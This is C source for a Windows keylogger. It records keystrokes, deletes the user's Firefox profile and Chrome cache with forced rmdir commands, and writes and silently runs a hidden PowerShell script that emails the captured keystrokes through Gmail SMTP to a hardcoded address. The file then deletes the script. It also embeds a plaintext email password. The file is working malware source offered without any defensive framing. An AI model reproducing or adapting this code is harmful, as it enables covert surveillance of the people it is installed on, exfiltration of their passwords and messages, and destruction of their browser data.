#include <stdio.h>
#include <windows.h>
#include <direct.h>
#include <Winuser.h>

void clearMozillaCache()
{
    char path[256]="C:\\Users\\";
    strcat(path,getenv("USERNAME")); // int getlogin_r(char *buf,size_t bufsize); unistd.h
    strcat(path,"\\AppData\\Roaming\\Mozilla\\Firefox\\");
    
    char removepath[256]="";
    strcat(removepath,"rmdir /Q /S "); //rm -rf 
    strcat(removepath,path);
    system(removepath);

    char createpath[256]="";
    strcat(createpath,"mkdir ");
    strcat(createpath,path);
    system(createpath);
}

void clearChromeCache()
{
    char path[256]="C:\\Users\\";
    strcat(path,getenv("USERNAME"));
    strcat(path,"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\");
    char removepath[256]="";
    strcat(removepath,"rmdir /Q /S ");
    strcat(removepath,path);
    system(removepath);

    char createpath[256]="";
    strcat(createpath,"mkdir ");
    strcat(createpath,path);
    system(createpath);

}

void clearBrowserCache()
{
    clearMozillaCache();
    //clearChromeCache();
}

void Save(char key,char* input)
{
    if(key==8)
        strcat(input,"[BackSpace]");
    else if(key==13)
        strcat(input,"\n");
    else if(key==32)
        strcat(input," ");
    else if(key==VK_TAB)
        strcat(input,"[TAB]");
    else if(key==VK_SHIFT)
        strcat(input,"[SHIFT]");
    else if(key==VK_CONTROL)
        strcat(input,"[CONTROL]");
    else if(key==VK_ESCAPE)
        strcat(input,"[ESCAPE]");
    else if(key==VK_END)
        strcat(input,"[END]");
    else if(key==VK_LEFT)
        strcat(input,"[LEFT]");
    else if(key==VK_RIGHT)
        strcat(input,"[RIGHT]");
    else if(key==VK_UP)
        strcat(input,"[UP]");
    else if(key==VK_DOWN)
        strcat(input,"[DOWN]");
    else if(key==VK_LEFT)
        strcat(input,"[LEFT]");
    else if(key==VK_RBUTTON)
        strcat(input,"[RBUTTON]");
    else if(key==VK_LBUTTON)
        strcat(input,"[LBUTTON]");
    else if(key==VK_OEM_PERIOD)
        strcat(input,".");
    else
    {
        char temp[2]="";
        temp[0]=key;
        temp[1]='\0';
        strcat(input,temp);
    }
}

void sentMail(char* input) //Debian-sudo apt-get install -y powershell CentOs-sudo yum install -y powershell OpenSUSE-sudo zypper install powershell Fedora-sudo dnf install -y powershell 
{
    FILE *fp=fopen("KeyLogger.ps1","ab+");
    fprintf(fp,"$Myemail=\"8ballpoolnikos@gmail.com\"\n");
    fprintf(fp,"$Mypass=\"8ballpool\"\n");
    fprintf(fp,"$SMTP=\"smtp.gmail.com\"\n");
    fprintf(fp,"$to=\"8ballpoolnikos@gmail.com\"\n");
    fprintf(fp,"$Subject=\"KEYLOGGER\"\n");
    fprintf(fp,"$Body=\"%s\"\n",input);
    fprintf(fp,"$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n");
    fprintf(fp,"$MyCredentials=New-object System.Management.Automation.PSCredential $MyEmail,$SecurePassword\n");
    fprintf(fp,"Send-MailMessage -To $to -From $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never\n");
    fclose(fp);
    char *syscall=(char*)malloc(100*sizeof(char));
    syscall[0]='\0';
    strcat(syscall,"PowerShell.exe -windowstyle hidden \"");
    char *curpath;
    curpath=_getcwd(NULL,0);
    strcat(syscall,curpath);
    strcat(syscall,"\\KeyLogger.ps1\"");
    system(syscall);
    remove("KeyLogger.ps1");
}

DWORD WINAPI ThreadFunc(void *data)  //void *ThreadFunc(void *vargp)
{   
    char* threadinput=(char*)malloc(1100*sizeof(char));
    threadinput[0]='\0';
    FILE *fp=fopen("Temp.txt","r");
    while(fgets(threadinput,1100,fp)!=NULL);
    printf("input:%s\n",threadinput);
    fclose(fp);
    remove("Temp.txt");
    sentMail(threadinput);
    free(threadinput);
    return 0;
}